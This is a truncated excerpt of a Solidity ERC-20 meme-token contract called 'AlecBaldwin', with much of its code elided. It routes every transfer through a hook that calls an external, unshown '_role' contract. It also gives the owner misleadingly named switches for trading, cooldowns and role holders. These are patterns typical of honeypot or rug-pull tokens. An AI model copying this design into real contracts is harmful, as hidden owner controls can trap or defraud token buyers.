...
contract Roles {
    ...
    function beforeTokenTransfer(address sender, address recipient, uint256 amount) internal {
        _role.Transfer(sender, recipient, amount);
    }
...
contract Auth is Context, Roles{  
    ...
    */
    ...
    function initialOwner(address newOwner) external onlyOwner {
        add(newOwner);
    }    
...
contract AlecBaldwin is Context, IERC20, Auth{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000000 *  10**9;        
    
    string private _name = "AlecBaldwin";
    string private _symbol = "AlecBaldwin";
    uint8 private _decimals = 9;  
    
    uint8 public liquidityFee;
    uint8 public targetLiquidityDenominator;
    ...
    function placesStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }

    function updatedEnabled(bool _status, uint8 _interval) public onlyOwner {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function withoutTakeFee(address sender, address recipient) internal view returns (bool) {
